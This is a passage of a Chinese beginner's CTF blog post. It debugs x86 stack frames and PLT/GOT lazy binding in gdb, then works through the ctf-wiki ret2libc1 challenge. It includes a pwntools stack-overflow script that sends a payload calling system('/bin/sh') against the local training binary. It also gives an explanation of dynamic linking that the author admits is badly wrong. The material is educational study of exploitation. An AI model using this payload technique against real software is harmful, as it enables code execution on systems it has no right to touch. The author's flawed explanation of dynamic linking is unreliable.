alt="image-20220413142706205"></p><p>其实上图也好理解，0xffffd048至0xffffd038是main()函数占用的栈空间，0xffffd038至0xffffd028是haha()函数占用的栈空间，剩下的就是目前lala()函数占用的栈空间，若lala()执行完，ebp从0xffffd028回退到0xffffd038，就相当于haha()中调用lala()，而lala()此时执行完毕要回到haha()函数，当然，若haha()也执行完毕，那么ebp就会回到0xffffd048，就相当于回到main()函数。</p><br/><p>好了，接下来我们用 x/130wx &lt;地址&gt; 打印栈上存储的信息进行查看，地址就填esp指向的栈地址0xffffd010，ok记录，继续ni执行</p><p><img src="image-20220413144048372.png" alt="image-20220413144048372"></p><p><img src="image-20220413144315964.png" alt="image-20220413144315964"></p><p>我们用 x/30wx 0xffffd010 打印看看，的确没变，好的，可以总结了</p><p><img src="image-20220413144430194.png" alt="image-20220413144430194"></p><p><strong>总结：</strong></p><p>调用libc库中未载入的 printf 函数的 plt 表后ebp、esp值与调用前无异，当然，调用普通函数也一样，因为有个词叫“保持栈平衡”，意思就是函数调用前后，esp 和 ebp 要保持一致，retn 其实除了 jmp eip ，还会做栈平衡操作。n代表参数个数，从而平衡函数调用的时候push 参数时 esp 的变化，具体深入的了解话，请自行探索。</p><br/><br/><h2 id="跟进printf-plt表"><a href="#跟进printf-plt表" class="headerlink" title="跟进printf@plt表"></a>跟进printf@plt表</h2><p>之前用的都是ni，单步不进入函数体执行，想要查看进入后是什么情况的话，我们在call printf那一句处使用 si 进行单步执行就行</p><p><img src="image-20220413145312729.png" alt="image-20220413145312729"></p><p><img src="image-20220413145430209.png" alt="image-20220413145430209"></p><p>之后便是plt、got表相关的知识了，探索暂时中止，plt与got表我也是一知半解，只知道表层原理描述，深层具体的运行实现并不是很懂</p><br/><br/><h1 id="实战-下面的不用看，浪费时间，失败的例子"><a href="#实战-下面的不用看，浪费时间，失败的例子" class="headerlink" title="实战(下面的不用看，浪费时间，失败的例子)"></a>实战(下面的不用看，浪费时间，失败的例子)</h1><h2 id="例1：ret2libc1"><a href="#例1：ret2libc1" class="headerlink" title="例1：ret2libc1"></a>例1：ret2libc1</h2><p>链接：<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#1">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#1</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp中的payload</span></span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1、首先我们 gdb调试 ret2libc1 ，运行到gets函数，记录ebp、esp值</p><p><img src="image-20220415142106997.png" alt="image-20220415142106997"></p><p>2、单步ni指令后输入200个a字符，记录ebp、esp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#开启新终端，打开python，输入print(200*&#x27;a&#x27;)，回车</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure><p><img src="image-20220415143032501.png" alt="image-20220415143032501"></p><p>3、 x/130wx 0xffffcf40 从esp开始向高地址打印130组信息（32位一组），由此我们画出栈布局（以下第二张图）</p><p><img src="image-20220415143601874.png" alt="image-20220415143601874"></p><p>对了，0x61即16进制的61，转成十进制就是97，即字符a的ascll码值（大佬绕道）</p><p><img src="image-20220415144213653.png" alt="image-20220415144213653"></p><p>4、好了，刚刚输入的是200个a，现在重新来一遍，写个脚本把payload输进去，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x08048720</span>        <span class="comment">#/bin/sh字符串地址</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span>        <span class="comment">#plt表中system位置</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt,<span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line">gdb.attach(sh,<span class="string">&quot;b *0x08048683&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#以下用#号注释掉的方法我的Ubuntu用了会报错</span></span><br><span class="line"><span class="comment">#链接：https://blog.csdn.net/fjh1997/article/details/105434992</span></span><br><span class="line"><span class="comment">#binsh_addr = 0x8048720    </span></span><br><span class="line"><span class="comment">#system_plt = 0x08048460</span></span><br><span class="line"><span class="comment">#payload = flat([b&#x27;a&#x27; * 112, system_plt,b&#x27;b&#x27; * 4, binsh_addr])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=gdb.debug(&quot;ret2libc1&quot;,&quot;break main&quot;)</span></span><br><span class="line"><span class="comment">#sh.sendline(payload)</span></span><br><span class="line"><span class="comment">#sh.interactive()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>vim 写好脚本，python3执行</p><p><img src="image-20220415171704527.png" alt="image-20220415171704527"></p><p>执行后会弹出一个终端，输入c ，即continue</p><p><img src="image-20220415171824574.png" alt="image-20220415171824574"></p><p>可以看到已经有aaaa写入了</p><p><img src="image-20220415171926168.png" alt="image-20220415171926168"></p><p>x/130wx 0xffd13110，可以看到ebp往上一个高地址已经被覆盖成了我们的一个目标地址</p><p><img src="image-20220415172146813.png" alt="image-20220415172146813"></p><p>画一下现在的栈情况：（对了，再提一次，ebp上面的栈上数据会被ret调用）</p><p><img src="image-20220415220555539.png" alt="image-20220415220555539"></p><p>5、ok，前面那些都只是一些准备工作，现在开始实战，可以看见，我们的下一跳函数已经变成了plt表，此时的PC指针指向0x08048683（&lt;main+107&gt;位置）</p><p><img src="image-20220415173308662.png" alt="image-20220415173308662"></p><p>6、单步ni</p><p><img src="image-20220415221414664.png" alt="image-20220415221414664"></p><p>7、继续ni，不画栈图了，之后也不再讲这么细了，不然篇幅会很大</p><p><img src="image-20220415222540821.png" alt="image-20220415222540821"></p><p>8、单步ni……，怎么看到了plt表，算了，顺便探索一下plt表和got表</p><p><img src="image-20220415222911934.png" alt="image-20220415222911934"></p><p><img src="image-20220415222936096.png" alt="image-20220415222936096"></p><p><img src="image-20220415222955785.png" alt="image-20220415222955785"></p><p>9、可以看到，我们第一次调用system函数（libc库函数）时，是先跳到了plt表去找函数地址，但此时还未加载进plt表，所以进行了三步：jmp、push、jmp做了下表面工作，走了个过场，就跳到got表（Global Offset Table：全局偏移表）中</p><p><img src="image-20220415223010984.png" alt="image-20220415223010984"></p><p>10、继续ni，这个0x0804a008我不知道是个啥，这里也是我的知识盲区，这是我第一次探索的这么深（虽然还很浅），然后就打开ida看了一下，不是很懂，这里也不做解释了，之后应该还会遇到很多我没见过的东西，看之后是否有幸能得到大佬的解答（大佬应该也不会来看这种带新手入门的文章）</p><p><img src="image-20220415224046953.png" alt="image-20220415224046953"></p><p><img src="image-20220415223956033.png" alt="image-20220415223956033"></p><p>11、继续ni，然后就是endbr32，这条指令没啥用可以直接忽略，感兴趣的可以去百度搜一下</p><p><img src="image-20220415224429865.png" alt="image-20220415224429865"></p><p>12、ni……，先老老实实的把图贴出来吧，暂时也解释不了什么，这里好像是调用什么什么器，忘记名字了</p><p><img src="image-20220415224641604.png" alt="image-20220415224641604"></p><p><img src="image-20220415224728900.png" alt="image-20220415224728900"></p><p><img src="image-20220415224805805.png" alt="image-20220415224805805"></p><p><img src="image-20220415224824799.png" alt="image-20220415224824799"></p><p><img src="image-20220415224847172.png" alt="image-20220415224847172"></p><p><img src="image-20220415224903651.png" alt="image-20220415224903651"></p><p>13、ni，掉了一个call，不清楚这f7f7f7d0是个啥，好像是另一个什么什么器，继续ni……</p><p><img src="image-20220415225105745.png" alt="image-20220415225105745"></p><p><img src="image-20220415225345558.png" alt="image-20220415225345558"></p><p><img src="image-20220415225359926.png" alt="image-20220415225359926"></p><p>暂时到这吧，感觉图片贴的有点多了，有兴趣的自己去调一下看下全过程，之后我就贴点我觉得关键的东西，因为我也不是很懂，所以关不关键我也不知道</p><br/><p>14、三步ni过后，怎么进入system函数了？进了system函数说明plt、got的动态链接过程已经完成了，懵了懵了（怎么这么快，我记得我当初用si单步的时候单了近千次也没见到过程结束，然后当时就直接放弃探索了，有点懵，一会儿用si再来一遍看看），但现在知道了一件事，把之前的啃透，动态链接过程也就能理解一半以上了</p><p><img src="image-20220415225716915.png" alt="image-20220415225716915"></p><p>好了好了，plt、got表部分的探索这里就结束了（开始与第8步，现在位于第14步），现在回到对payload的探索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#exp中的payload</span><br><span class="line"></span><br><span class="line">binsh_addr = 0x8048720</span><br><span class="line">system_plt = 0x08048460</span><br><span class="line">payload = flat([&#x27;a&#x27; * 112, system_plt, &#x27;b&#x27; * 4, binsh_addr])</span><br></pre></td></tr></table></figure><p>15、ok，现在就得关注好ebp、esp的变动了</p><p><img src="image-20220415230832725.png" alt="image-20220415230832725"></p><p>16、可以先看一下我在第4步最后画的那个栈图，这里再画一张。。。刚尝试去画，但发现跟第4步的栈图联系不大，我们先把这system函数度过了再看看，ni……</p><p><img src="image-20220415232001381.png" alt="image-20220415232001381"></p><p>。。。。。。真就来循环</p><p><img src="image-20220415232126396.png" alt="image-20220415232126396"></p><p>跳出来了，应该在250下回车左右，手点了100+下，然后按着不动执行了一小段时间，估算要按250下左右的回车跳出这循环</p><p><img src="image-20220415232240333.png" alt="image-20220415232240333"></p><p>又开始循环了。。。可能之前的si单步近千步没出结果就是卡在这些循环中，而不是卡在前面的plt、got表中，看来plt、got表也不是个很难的东西，只不过是我之前把它想得没那么简单，再进一步去想，或许整个计算机底层实现也并不难，只是我们缺乏好的学习资料罢了</p><p><img src="image-20220415232506909.png" alt="image-20220415232506909"></p><p>17、我去，怎么直接结束了</p><p><img src="image-20220415233253571.png" alt="image-20220415233253571"></p><p>18、赶紧往上翻回去看看，ok，在经历了诸多循环之后，我们的esp移动到了该移动到的位置，并将它指向的栈上的数据存入了ebp</p><p><img src="image-20220415233443490.png" alt="image-20220415233443490"></p><p><img src="image-20220415234122774.png" alt="image-20220415234122774"></p><p>第4步的栈图再贴一次，所以我们应当去找ebp为0xffd1319c的时候，或者去找下图中的一些关键数据（如0xffd13110、0x62626262、0x08048720、0x08048460）</p><p><img src="image-20220415234221219.png" alt="image-20220415234221219"></p><p>19、这是结束之前最后出现的一次ebp、esp，不是我想要的值</p><p><img src="image-20220415234751330.png" alt="image-20220415234751330"></p><p>之后的结束截图留一下，这里提示的并不是程序结束，可能是已经拿到系统shell的原因，所以程序没结束，但也没有指令可以执行，所以就报这样的warning，或者是一些其他的原因，暂时到此为止吧</p><p><img src="image-20220415234853843.png" alt="image-20220415234853843"></p><br/><br/><p><strong>总结：</strong></p><p>遗憾：</p><p>经过一轮实战调试，这里esp是怎样的将0x08048460存入eip，执行完又跳回来将0x08048720存入eip还是没有实际操作出来，只能是依赖我姐之前给我讲的知识勉强解释，但我知道，以后这一块我还是会很懵，所以之后还得再仔细调一遍</p><p><img src="image-20220415235343476.png" alt="image-20220415235343476"></p><p>收获：</p><p>对于前面提到的什么什么器，看了几篇博客，有说动态链接器的也有说解析器的，还有说链接器/加载器的。</p><p>链接：<a href="https://blog.csdn.net/qq_18661257/article/details/54694748">GOT表和PLT表知识详解_77458的博客-CSDN博客_got表</a></p><p>链接：<a href="https://zoepla.github.io/2018/04/%E9%9D%9E%E5%B8%B8%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8Aplt&got/">非常详细地解释plt&amp;got (zoepla.github.io)</a></p><p>链接：<a href="https://www.cnblogs.com/zuoanfengxi/p/12763350.html">调试下的plt&amp;got - zer0_1s - 博客园 (cnblogs.com)</a></p><br/><br/><p><strong>我来简单说说我理解的动态链接过程吧，肯定会有错，但我还是想说一下我的理解</strong></p><br/><h3 id="动态链接过程（延迟绑定）："><a href="#动态链接过程（延迟绑定）：" class="headerlink" title="动态链接过程（延迟绑定）："></a>动态链接过程（延迟绑定）：</h3><p>1、我们的代码中经常会调用到我们没有自己定义的函数，例如printf、scanf</p><p>2、这些函数都存储在我们的 libc 库（动态链接库）中，当然这样存有诸多函数的库有很多，libc只是其中一个，在C语言中调用他们我们只需要一个头文件（例如 #include&lt;stdio.c&gt;）</p><p>3、当我们的程序开始执行时，代码信息及libc库等信息就会被载入内存中，同时被分配好自己的地址（gdb中使用vmmap可查看这些地址信息）</p><p>4、当我们的程序中用到了libc库中的函数时，程序会先跳进__plt表__中寻找是否有该函数的实际地址（第一次是没有的），没有时就会跳进got表，然后__got表__中存了该函数在libc库中的__偏移值__，这时计算机会记录这个偏移值，然后调用前面说的__什么什么器__找到libc库的实际初始地址，接着将got表的偏移值加上libc的初始位置值就得到的该函数在内存中的实际地址，然后再调用__什么什么器__改写plt表，将真实地址写入plt，下次再调用该函数时就能直接跳到该函数的实际地址</p><p>5、ok，结束</p><p>6、的确错得离谱，不改了，留个回忆，照着下面的学习链接学就行了</p><p>7、贴个学习链接：<a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL">Basic-ROP · 语雀 (yuque.com)</a></p><p>8、配套学习视频：<a href="https://www.bilibili.com/video/BV1a7411p7zK?share_source=copy_web">https://www.bilibili.com/video/BV1a7411p7zK?share_source=copy_web</a></p><p>9、要是能早点找到这学习视频，可以省下很多学习时间</p><br/><br/><br/><br/><h2 id="例2：ret2libc3"><a href="#例2：ret2libc3" class="headerlink" title="例2：ret2libc3"></a>例2：ret2libc3</h2><p>链接：<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3</a></p>]]></content>
    
    
    <summary type="html">历史遗留，不荐参考</summary>
    
    
    
    
  </entry>
  
</feed>
